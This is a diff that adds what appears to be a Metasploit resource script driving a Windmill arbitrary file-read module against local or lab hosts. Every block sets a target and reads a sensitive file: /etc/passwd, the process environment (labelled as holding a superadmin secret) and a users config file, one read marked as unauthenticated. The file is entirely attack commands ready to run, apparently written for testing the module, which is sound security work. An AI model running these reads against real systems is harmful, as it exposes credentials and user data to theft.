@@ -1,0 +1,30 @@
+# =============================================
+# auxiliary/gather/windmill_file_read
+# =============================================
+
+use auxiliary/gather/windmill_file_read
+
+# --- Standalone: /etc/passwd ---
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+set FILEPATH /etc/passwd
+run
+
+# --- Standalone: /proc/1/environ (SUPERADMIN_SECRET) ---
+set FILEPATH /proc/1/environ
+run
+
+# --- Flow Proxy: windmill_users_config.json (UNAUTHENTICATED!) ---
+set RHOSTS localhost.local
+set RPORT 443
+set SSL true
+set FILEPATH /nc_app_flow_data/windmill_users_config.json
+run
+
+# --- Flow Direct: /etc/passwd ---
+set RHOSTS 172.23.0.10
+set RPORT 8000
+set SSL false
+set FILEPATH /etc/passwd
+run
